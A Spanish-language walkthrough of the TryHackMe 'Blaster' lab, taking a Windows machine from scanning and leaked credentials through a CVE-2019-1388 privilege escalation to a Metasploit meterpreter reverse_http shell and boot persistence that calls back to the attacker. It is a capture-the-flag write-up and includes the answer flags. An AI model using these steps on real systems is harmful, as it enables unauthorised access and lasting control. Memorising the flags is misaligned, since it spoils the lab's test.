# BLASTER

## Task 1: Mission start!
Start Machine (obtener la IP)

## Task 2: Activate Forward Scanners and Launch Proton Torpedoes

### (a) ¿Cuántos puertos abiertos hay en nuestro sistema objetivo?
Usaremos el comando **`nmap -T4 -A -p- <target ip>`** y veremos que hay **2** puertos abiertos: **80/tcp** y **3389/tcp**.

![puertos_abiertos](./Task_2/puertos_abiertos.png)

**ANSWER:** 2

### (b) ¿Cuál es el nombre del sitio web?
Escribimos la IP que nos ha dado THM en el navegador y veremos que el nombre del sitio web resultante es: **IIS Windows Server**

![nombre_sitio_web](./Task_2/nombre_sitio_web.png)


**ANSWER:** IIS Windows Server

### (c) ¿Qué directorio oculto descubrimos al hacer fuzzing?
Si hacemos fuzzing con **feroxbuster** veremos que el directorio buscado es **/retro**.

![fuzzing](./Task_2/feroxbuster_retro.png)

**ANSWER:** /retro

### (d) Si navegamos a esa carpeta, ¿qué nombre de usuario descubrimos?
Si vamos al navegador y escribimos **"target ip"/retro** encontraremos el nombre de usuario **wade** en el sitio web.

![Wade](./Task_2/Wade_user.png)

**ANSWER:** wade

### (e) ¿Qué posible contraseña podemos encontrar en los comentarios de la web?
Si buscamos en los comentarios de la página encontraremos uno en el que Wade escribe la posible contraseña (**en el segundo comentario**)

![Wade_Password??](./Task_2/Wade_user.png)

![Wade_Password??](./Task_2/Wade_password(1).png)

![Wade_Password??](./Task_2/Wade_password(2).png)

**ANSWER:** parzival

### (f) ¿Qué contiene el fichero user.txt? Tendremos que loggearnos via Microsoft Remote Desktop.
Abrimos un terminal aparte y escribimos el siguiente comando:
**`rdesktop -u wade -p parzival -g 1280x720 <target_ip>`**

Una vez hecho esto, abrimeros el fichero **user.txt** y dentro veremos la respuesta a esta pregunta de THM.

![RDP](./Task_2/RDP(1).png)
![RDP](./Task_2/RDP(2).png)
![RDP](./Task_2/RDP(3).png)

**ANSWER:** THM{HACK_PLAYER_ONE}

## Task 3: Breaching the Control Room

### (a) ¿Cuál fue el CVE investigado en el escritorio remoto?
Si accedemos al historial de Internet Explorer y pulsamos en la estrellita para ver el historial veremos que el **CVE-2019-1388**, el cual está relacionado con una **vulnerabilidad de elevación de privilegios**, es el que buscamos:

![CVE](./Task_3/CVE-2019-1388.png)

**ANSWER**: CVE-2019-1388

### (b) ¿Cuál es el nombre del ejecutable necesario para explotar esta vulnerabilidad?
Si volvemos al escritorio veremos que hay un ejecutable llamado **hhupd**. Ese es el que buscamos.

![hhupd](./Task_3/ejecutable_malicioso.png)

**ANSWER**: hhupd

### (c) Explota la vulnerabilidad
Para explotar esa vulnerabilidad empezaremos cargando el ejecutable **hhupd** como administrador. Veremos que se nos pide una contraseña que no tenemos.

![CMD_privileges](./Task_3/CMD_privileges(1).png)

Lo que haremos entonces será pinchar en **Show more details > Show information about the publisher's certificate > VeriSign Commercial Software Publishers CA**.

![CMD_privileges](./Task_3/CMD_privileges(2).png)

Ese último paso nos abrirá el navegador de **Internet Explorer**, el cual nos indicará que no es capaz de cargar la página. Lo que haremos será pinchar en **Settings > File > Save as...** para descargar el archivo.

![CMD_privileges](./Task_3/CMD_privileges(3).png)

Cuando se nos abrá el explorador de archivos escribiremos **C:\Windows\System32\"."** en la barra del nombre del archivo y posteriormente **C:\Windows\System32\cmd.exe** en la barra superior.

![CMD_privileges](./Task_3/CMD_privileges(4).png)

Eso nos abrirá una **terminal**. Si introducimos el comando **whoami** veremos que somos **administradores** del sistema.

![CMD_privileges](./Task_3/CMD_privileges(5).png)

### (d) Una vez obtenida la terminal de administrador, si hacemos whoami qué nombre de usuario sale
Acabamos de verlo.

**ANSWER:** nt authority\system

### (e) ¿Qué contiene el archivo root.txt?
Si nos movemos a la carpeta del usuario **Administrator** y luego a **Desktop**, y hacemos **dir**, encontraremos un archivo llamado **root.txt**. Si visualizamos su contenido con el comando **type** encontraremos la **flag**.

![root_txt](./Task_3/root_txt.png)

**ANSWER:** THM{COIN_OPERATED_EXPLOITATION}

## Task 4: Adoption into the Collective
### (a) Abre Metasploit y ejecuta el script `exploit/multi/script/web_delivery`
![exploit](./Task_4/ejecutar_exploit.png)

### (b) Establece el target para PSH (PowerShell). ¿Qué número es?
![set_target](./Task_4/set_target.png)

**ANSWER:** 2

### (c) Establece LHOST y LPORT
![lhost_lport](./Task_4/lhost_lport.png)

### (d) Ejecuta el comando `set payload windows/meterpreter/reverse_http` y después `run -j`.
Establecemos el payload (deberemos cambiar **lport** a 443 para que lo haga bien)

![set_payload](./Task_4/set_payload.png)
![change_lport](./Task_4/change_lport.png)

Ejecutamos el payload

![run_j](./Task_4/run_j.png)

### (e) Hazte root en la máquina objetivo
Copiamos la **salida de Metasploit** y me la llevo al terminal_admin del escritorio remoto y la pego ahí.

![script_rdesktop](./Task_4/script_rdesktop.png)

Al pulsar Enter conseguiremos hacernos **root**.

![script_rdesktop](./Task_4/resultado_terminal_kali.png)

### (f) ¿Qué comando podemos ejecutar en nuestra consola de meterpreter para configurar la persistencia que se inicia automáticamente cuando se inicia el sistema?
![persistencia_x](./Task_4/persistencia_x.png)

**ANSWER:** run persistence -x

### (g) Ejecuta el comando `run persistence x -r <ip-THM> -p 9001`
![run_persistence_x](./Task_4/run_persistence_x.png)

Con esto habremos establecido **persistencia** en la máquina objetivo para realizar futuras acciones en ella.































